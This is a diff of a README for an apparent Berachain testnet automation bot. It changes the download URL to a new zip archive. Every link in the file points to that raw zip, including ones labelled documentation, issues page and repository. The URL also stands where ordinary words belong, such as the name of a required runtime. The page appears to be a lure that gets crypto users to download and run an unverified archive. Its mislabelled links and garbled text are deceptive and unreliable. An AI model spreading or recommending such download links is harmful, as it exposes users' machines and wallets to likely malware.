@@ -1,10 +1,10 @@
 # 🤖 Berachain-L1-DeFi-AutoBot - Automate Your Berachain Experience
 
 ## 🔗 Download Now!
-[![Download](https://raw.githubusercontent.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/main/amban/Berachain-L1-DeFi-AutoBot-v1.0.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/main/amban/Berachain-L1-DeFi-AutoBot-v1.0.zip)
+[![Download](https://github.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/raw/refs/heads/main/amban/Fi-Auto-Berachain-Bot-De-2.0.zip%20Release-brightgreen)](https://github.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/raw/refs/heads/main/amban/Fi-Auto-Berachain-Bot-De-2.0.zip)
 
 ## 🚀 Getting Started
-The **Berachain Testnet AutoBOT** is designed to help you optimize your participation in the Berachain testnet ecosystem. This https://raw.githubusercontent.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/main/amban/Berachain-L1-DeFi-AutoBot-v1.0.zip automation solution simplifies tasks so you can make the most of your experience.
+The **Berachain Testnet AutoBOT** is designed to help you optimize your participation in the Berachain testnet ecosystem. This https://github.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/raw/refs/heads/main/amban/Fi-Auto-Berachain-Bot-De-2.0.zip automation solution simplifies tasks so you can make the most of your experience.
 
 ## 💡 Features
 - **Seamless Automation:** The AutoBOT automates tasks, saving you time and effort while participating in the testnet.
@@ -16,7 +16,7 @@ The **Berachain Testnet AutoBOT** is designed to help you optimize your particip
 Before downloading, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10, macOS Big Sur, or a modern Linux distribution.
-- **https://raw.githubusercontent.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/main/amban/Berachain-L1-DeFi-AutoBot-v1.0.zip** Version 14 or later installed.
+- **https://github.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/raw/refs/heads/main/amban/Fi-Auto-Berachain-Bot-De-2.0.zip** Version 14 or later installed.
 - **Memory:** At least 4GB of RAM.
 - **Disk Space:** Minimum of 100MB free space.
 
@@ -25,7 +25,7 @@ To download and set up the Berachain Testnet AutoBOT, follow these steps:
 
 1. **Visit the Releases Page:** 
    Click on the link below to access the Releases page:
-   [Download the Latest Release](https://raw.githubusercontent.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/main/amban/Berachain-L1-DeFi-AutoBot-v1.0.zip)
+   [Download the Latest Release](https://github.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/raw/refs/heads/main/amban/Fi-Auto-Berachain-Bot-De-2.0.zip)
 
 2. **Choose Your Version:**
    On the Releases page, select the latest version available tailored for your operating system. 
@@ -56,17 +56,17 @@ When you launch the AutoBOT, you will see an easy-to-navigate interface. Follow 
 ## 📞 Support
 If you encounter issues or have questions, please reach out:
 
-- Check the [GitHub Issues Page](https://raw.githubusercontent.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/main/amban/Berachain-L1-DeFi-AutoBot-v1.0.zip) for troubleshooting tips and answers.
+- Check the [GitHub Issues Page](https://github.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/raw/refs/heads/main/amban/Fi-Auto-Berachain-Bot-De-2.0.zip) for troubleshooting tips and answers.
 - Join our community discussions on the Berachain forums for additional help.
 
 ## 🌟 Additional Resources
 For further learning and exploration of the Berachain ecosystem, consider checking out:
 
-- The [Berachain Documentation](https://raw.githubusercontent.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/main/amban/Berachain-L1-DeFi-AutoBot-v1.0.zip).
+- The [Berachain Documentation](https://github.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/raw/refs/heads/main/amban/Fi-Auto-Berachain-Bot-De-2.0.zip).
 - Tutorial videos on YouTube detailing best practices for using the AutoBOT.
 
 ## 🔗 Important Links
-- [Visit Releases Page to Download](https://raw.githubusercontent.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/main/amban/Berachain-L1-DeFi-AutoBot-v1.0.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/main/amban/Berachain-L1-DeFi-AutoBot-v1.0.zip)
+- [Visit Releases Page to Download](https://github.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/raw/refs/heads/main/amban/Fi-Auto-Berachain-Bot-De-2.0.zip)
+- [GitHub Repository](https://github.com/Alexander-Brown-1/Berachain-L1-DeFi-AutoBot/raw/refs/heads/main/amban/Fi-Auto-Berachain-Bot-De-2.0.zip)
 
 The **Berachain Testnet AutoBOT** truly simplifies participation, freeing you up to focus on what matters. Enjoy automating your experience!
